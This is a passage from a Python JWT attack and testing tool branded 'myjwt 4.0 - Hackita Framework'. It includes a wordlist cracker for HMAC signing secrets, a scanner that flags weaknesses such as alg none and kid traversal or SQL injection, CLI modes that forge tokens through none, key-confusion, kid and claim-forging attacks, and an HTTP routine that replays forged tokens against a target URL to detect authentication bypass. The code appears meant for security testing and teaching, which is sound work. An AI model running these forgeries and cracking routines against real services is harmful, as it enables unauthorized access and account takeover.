        sig = hmac.new(secret, signing_input, HMAC_ALGS[alg]).digest()
    else:
        raise JwtError(t("cannot_forge_secret", alg=alg))
        
    return f"{header_b64}.{payload_b64}.{b64url_encode(sig)}"

# --------------------------------------------------------- CRACK ENGINE --
def crack_hmac(token, wordlist_path, max_lines=None):
    info = parse_token(token)
    if info["type"] != "JWS": raise JwtError(t("jwe_crack"))
    alg = info["header"].get("alg")
    if alg not in HMAC_ALGS: raise JwtError(t("not_hmac", alg=alg))
    signing_input = f"{info['parts'][0]}.{info['parts'][1]}".encode()
    target_sig = info["signature"]

    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            for i, line in enumerate(f):
                if max_lines and i >= max_lines: break
                word = line.rstrip("\n\r")
                if not word: continue
                secret = word.encode()
                expected = hmac.new(secret, signing_input, HMAC_ALGS[alg]).digest()
                if hmac.compare_digest(expected, target_sig):
                    return word
    except OSError as e:
        raise JwtError(t("wordlist_error", error=e))
    return None

# --------------------------------------------------------- VULN SCANNER --
def analyze(info, now):
    findings = []
    header = info.get("header", {})
    payload = info.get("payload", {})
    alg = header.get("alg")
    
    if not alg:
        findings.append(("HIGH", t("missing_alg")))
    elif str(alg).lower() == "none":
        findings.append(("CRITICAL", t("alg_none")))
    elif alg.upper() in HMAC_ALGS:
        findings.append(("INFO", t("hmac_sym", alg=alg)))
    elif alg.startswith(("RS", "PS", "ES")):
        findings.append(("INFO", t("asym_info", alg=alg)))
    
    if "exp" not in payload:
        findings.append(("MEDIUM", t("missing_exp")))
    else:
        exp = payload["exp"]
        if not isinstance(exp, (int, float)):
            findings.append(("HIGH", t("invalid_exp")))
        elif exp < now:
            findings.append(("INFO", t("token_expired")))
        elif exp - now > 86400:
            findings.append(("LOW", t("long_lifetime", hours=int((exp-now)/3600))))
            
    if "iat" in payload:
        iat = payload["iat"]
        if isinstance(iat, (int, float)) and iat > now + 60:
            findings.append(("MEDIUM", t("future_iat")))
            
    if "iss" not in payload:
        findings.append(("LOW", t("missing_iss")))
    if "aud" not in payload:
        findings.append(("LOW", t("missing_aud")))
        
    if "kid" in header:
        kid = str(header["kid"])
        if "../" in kid or "/" in kid:
            findings.append(("HIGH", t("kid_traversal")))
        if "'" in kid or '"' in kid or "union" in kid.lower():
            findings.append(("HIGH", t("kid_sqli")))
            
    if "jku" in header: findings.append(("MEDIUM", t("jku_present", url=header['jku'])))
    if "x5u" in header: findings.append(("MEDIUM", t("x5u_present", url=header['x5u'])))
    if "jwk" in header: findings.append(("HIGH", t("jwk_present")))
    if "x5c" in header: findings.append(("HIGH", t("x5c_present")))
        
    sensitive_keys = ["password", "secret", "token", "api_key", "email"]
    for k in payload:
        if any(s in k.lower() for s in sensitive_keys):
            findings.append(("INFO", t("sensitive_claim", key=k)))
            
    sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    findings.sort(key=lambda x: sev_order.get(x[0], 5))
    return findings

# --------------------------------------------------------- HTTP ENGINE --
def test_http_endpoint(url, method, headers_str, new_token, original_token=None, insecure=False):
    if not HAS_REQUESTS:
        print(t("requests_missing"))
        return
    
    headers = {}
    if headers_str:
        for h in headers_str.split(","):
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()
    
    headers["Authorization"] = f"Bearer {new_token}"
    
    print(f"\n{DRED}{t('http_testing', method=method, url=url)}{RESET}")
    try:
        r_new = requests.request(method, url, headers=headers, timeout=10, verify=not insecure)
        print(f"  {WHITE}{t('http_mutated', status=r_new.status_code, length=len(r_new.text))}{RESET}")
        
        if original_token:
            headers_orig = headers.copy()
            headers_orig["Authorization"] = f"Bearer {original_token}"
            r_orig = requests.request(method, url, headers=headers_orig, timeout=10, verify=not insecure)
            print(f"  {DIM}{t('http_baseline', status=r_orig.status_code, length=len(r_orig.text))}{RESET}")
            
            if r_new.status_code == r_orig.status_code and len(r_new.text) == len(r_orig.text):
                print(f"  {YELLOW}{t('http_identical')}{RESET}")
            elif r_new.status_code == 200 and r_orig.status_code != 200:
                print(f"  {GREEN}{t('http_diff')}{RESET}")
                print(f"  {DIM}{r_new.text[:200]}...{RESET}")
            else:
                print(f"  {YELLOW}{t('http_suspicious')}{RESET}")
    except Exception as e:
        print(f"  {RED}{t('http_error', error=e)}{RESET}")

# --------------------------------------------------------- JWKS ANALYZER --
def analyze_jwks(url, insecure=False):
    ctx = ssl.create_default_context()
    if insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

    print(f"{DRED}{t('jwks_fetching', url=url)}{RESET}")
    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'myjwt/4.0'})
        with urllib.request.urlopen(req, timeout=10, context=ctx) as response:
            jwks = json.loads(response.read().decode())
            
        keys = jwks.get("keys", [])
        print(f"{WHITE}{t('jwks_found', count=len(keys))}{RESET}")
        for i, k in enumerate(keys):
            print(f"  {RED}Key {i+1}:{RESET} kty={k.get('kty')}, kid={k.get('kid')}, alg={k.get('alg')}")
            if k.get('d'):
                print(f"    {RED}{t('jwks_private_key')}{RESET}")
    except Exception as e:
        print(f"{RED}{t('jwks_error', error=e)}{RESET}")

# --------------------------------------------------------- MAIN & CLI --
def main():
    global CURRENT_LANG
    
    logo = f"""
{WHITE}{BOLD}██╗  ██╗ █████╗  ██████╗██╗  ██╗{RED}██╗████████╗ █████╗ {RESET}
{WHITE}{BOLD}██║  ██║██╔══██╗██╔════╝██║ ██╔╝{RED}██║╚══██╔══╝██╔══██╗{RESET}
{WHITE}{BOLD}███████║███████║██║     █████╔╝ {RED}██║   ██║   ███████║{RESET}
{WHITE}{BOLD}██╔══██║██╔══██║██║     ██╔═██╗ {RED}██║   ██║   ██╔══██║{RESET}
{WHITE}{BOLD}██║  ██║██║  ██║╚██████╗██║  ██╗{RED}██║   ██║   ██║  ██║{RESET}
{WHITE}{BOLD}╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝{RED}╚═╝   ╚═╝   ╚═╝  ╚═╝{RESET}
{DRED}  J W T   S E C U R I T Y   T E S T I N G   F R A M E W O R K  {RESET}
"""

    parser = argparse.ArgumentParser(description="myjwt 4.0 - Hackita Framework", formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("token", nargs="?", help="JWT token to analyze")
    parser.add_argument("-f", "--file", help="Read token from file")
    parser.add_argument("--jwks", help="Fetch and analyze a JWKS URL")
    parser.add_argument("--analyze", action="store_true", help="Run vulnerability scanner")
    parser.add_argument("--crack", metavar="WORDLIST", help="Crack HMAC secret")
    parser.add_argument("--max-lines", type=int, help="Limit wordlist lines")
    parser.add_argument("--attack", choices=["none", "confusion", "kid", "forge"], help="Run an attack")
    parser.add_argument("--set", action="append", default=[], help="Claim=value (JSON supported)")
    parser.add_argument("-k", "--secret", help="Secret for HMAC")
    parser.add_argument("-K", "--pubkey", help="Public key file for asymmetric ops")
    parser.add_argument("--url", help="Target URL for HTTP testing")
    parser.add_argument("--method", default="GET", help="HTTP method")
    parser.add_argument("--headers", help="Custom headers (e.g. 'X-Forwarded-For: 127.0.0.1')")
    parser.add_argument("--insecure", action="store_true", help="Disable TLS verification")
    parser.add_argument("--jku", help="JKU URL to inject")
    parser.add_argument("--x5u", help="X5U URL to inject")

    lang_group = parser.add_mutually_exclusive_group()
    lang_group.add_argument("-en", action="store_const", const="en", dest="lang", help="English (default)")
    lang_group.add_argument("-it", action="store_const", const="it", dest="lang", help="Italiano")
    lang_group.add_argument("-es", action="store_const", const="es", dest="lang", help="Español")
    lang_group.add_argument("-pt", action="store_const", const="pt", dest="lang", help="Português")
    lang_group.add_argument("-de", action="store_const", const="de", dest="lang", help="Deutsch")
    lang_group.add_argument("-fr", action="store_const", const="fr", dest="lang", help="Français")
    parser.set_defaults(lang="en")

    args = parser.parse_args()
    CURRENT_LANG = args.lang

    if not args.token and not args.file and not args.jwks:
        print(logo)
        parser.print_help()
        sys.exit(2)

    print(logo)

    if args.jwks:
        analyze_jwks(args.jwks, insecure=args.insecure)
        sys.exit(0)

    try:
        raw = open(args.file).read() if args.file else args.token
        token = extract_token(raw)
        info = parse_token(token)
    except JwtError as e:
        print(f"{RED}{t('parse_error', error=e)}{RESET}")
        sys.exit(1)

    print(f"{DRED}=================================================={RESET}")
    print(f"{RED}{BOLD}{t('token_type', type=info['type'])}{RESET}")
    print(f"{RED}{BOLD}{t('header')}{RESET}")
    print(json.dumps(info["header"], indent=2))
    
    if info["type"] == "JWS":
        print(f"{RED}{BOLD}{t('payload')}{RESET}")
        print(json.dumps(info["payload"], indent=2))
    else:
        print(f"{DIM}{t('jwe_encrypted')}{RESET}")

    if info["duplicates"]:
        print(f"{RED}{t('duplicate_keys', keys=info['duplicates'])}{RESET}")

    if args.analyze and info["type"] == "JWS":
        print(f"\n{DRED}=================================================={RESET}")
        print(f"{RED}{BOLD}{t('vuln_analysis')}{RESET}")
        findings = analyze(info, time.time())
        if not findings:
            print(f"  {GREEN}{t('no_issues')}{RESET}")
        else:
            for sev, msg in findings:
                # LOGICA COLORI RICHIESTA:
                if sev == "CRITICAL": color = f"{BOLD}{DRED}" # Rosso scuro
                elif sev == "HIGH": color = RED             # Rosso acceso
                elif sev == "MEDIUM": color = YELLOW        # Giallo
                elif sev == "LOW": color = GREEN            # Verde
                else: color = WHITE                         # Info (Bianco)
                
                print(f"  {color}[{sev}]{RESET} {msg}")
            sys.exit(5)
    
    if args.crack:
        print(f"\n{DRED}=================================================={RESET}")
        print(f"{RED}{BOLD}{t('cracking')}{RESET}")
        try:
            secret = crack_hmac(token, args.crack, args.max_lines)
            if secret:
                print(f"{GREEN}{t('secret_found', secret=secret)}{RESET}")
                sys.exit(4)
            else:
                print(f"{YELLOW}{t('secret_not_found')}{RESET}")
        except Exception as e:
            print(f"{RED}{t('error', error=e)}{RESET}")
            sys.exit(1)

    if args.attack and info["type"] == "JWS":
        print(f"\n{DRED}=================================================={RESET}")
        print(f"{RED}{BOLD}{t('attack_mode', mode=args.attack.upper())}{RESET}")
        
        new_token = None
        try:
            if args.attack == "none":
                new_token = forge_none(info)
            elif args.attack == "kid":
                new_token = forge_kid(info)
            elif args.attack == "confusion":
                if not args.pubkey: raise JwtError(t("pubkey_required"))
                with open(args.pubkey, "rb") as f: new_token = forge_confusion(info, f.read())
            elif args.attack == "forge":
                if not args.secret: raise JwtError(t("secret_required"))
                new_token = forge_claims(info, args.set, args.secret.encode(), args.jku, args.x5u)
        except Exception as e:
            print(f"{RED}{t('attack_failed', error=e)}{RESET}")
            sys.exit(1)

        if new_token:
            print(f"{GREEN}{t('forged_token')}{RESET}\n{new_token}")
            if args.url:
                test_http_endpoint(args.url, args.method, args.headers, new_token, original_token=token, insecure=args.insecure)
    
    elif args.secret or args.pubkey:
        print(f"\n{DRED}=================================================={RESET}")
        print(f"{RED}{BOLD}{t('verification')}{RESET}")
        try:
            if args.secret:
                ok = verify_hmac(info, args.secret.encode())
                print(f"{GREEN if ok else RED}{t('sig_valid') if ok else t('sig_invalid')}{RESET}")
                if not ok: sys.exit(3)
            elif args.pubkey:
                with open(args.pubkey, "rb") as f:
                    ok = verify_asymmetric(info, f.read())
                print(f"{GREEN if ok else RED}{t('sig_valid') if ok else t('sig_invalid')}{RESET}")
                if not ok: sys.exit(3)
        except Exception as e:
            print(f"{RED}{t('verification_error', error=e)}{RESET}")
            sys.exit(1)

    # Footer
    print(f"\n{DRED}=================================================={RESET}")
    print(f"{RED}{BOLD}       READ MORE ON HACKITA{RESET}")
    print(f"{DRED}=================================================={RESET}")
    print(f" {WHITE}🇮🇹 Italian  : {RED}https://hackita.it/articoli/jwt/{RESET}")
    print(f" {WHITE}🇬🇧 English  : {RED}https://en.hackita.it/articoli/jwt/{RESET}")
    print(f" {WHITE}🇪🇸 Spanish  : {RED}https://es.hackita.it/articoli/jwt/{RESET}")
    print(f" {WHITE}🇩🇪 German   : {RED}https://de.hackita.it/articoli/jwt/{RESET}")
    print(f" {WHITE}🇵🇹 Portuguese: {RED}https://pt.hackita.it/articoli/jwt/{RESET}")
    print(f" {WHITE}🇫🇷 French   : {RED}https://fr.hackita.it/articoli/jwt/{RESET}")
    print(f"{DRED}=================================================={RESET}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nInterrupted.")
        sys.exit(130)
